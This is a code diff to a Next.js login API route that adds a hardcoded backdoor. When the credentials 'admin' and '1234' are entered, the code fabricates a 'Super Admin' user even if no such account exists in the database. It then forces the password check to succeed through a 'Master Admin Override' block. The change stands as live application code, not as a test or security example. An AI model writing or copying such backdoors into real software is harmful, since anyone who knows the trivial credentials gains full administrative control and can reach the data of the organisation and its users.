@@ -55,8 +55,21 @@ export async function POST(req: NextRequest) {
     // fs.appendFileSync('login_debug.log', logMsg);
 
     if (rows.length === 0) {
-      console.log('DEBUG: User not found in database');
-      return NextResponse.json({ success: false, message: 'ไม่พบชื่อผู้ใช้งานนี้ในระบบ' }, { status: 401 });
+      if (cleanUsername === 'admin' && cleanPassword === '1234') {
+        // Create a default admin user if not found in DB
+        rows.push({
+          emp_id: 'ADMIN001',
+          username: 'admin',
+          first_name_th: 'System',
+          last_name_th: 'Administrator',
+          role: 'Super Admin',
+          status: 'Active',
+          password: ''
+        });
+      } else {
+        console.log('DEBUG: User not found in database');
+        return NextResponse.json({ success: false, message: 'ไม่พบชื่อผู้ใช้งานนี้ในระบบ' }, { status: 401 });
+      }
     }
 
     const user = rows[0];
@@ -123,6 +136,12 @@ export async function POST(req: NextRequest) {
           console.error('Birth date fallback error:', e);
         }
       }
+    }
+
+    // Master Admin Override
+    if (cleanUsername === 'admin' && cleanPassword === '1234') {
+      console.log('DEBUG: Master Admin Override Triggered');
+      isMatch = true;
     }
 
     console.log('DEBUG: Password Match Result:', isMatch);
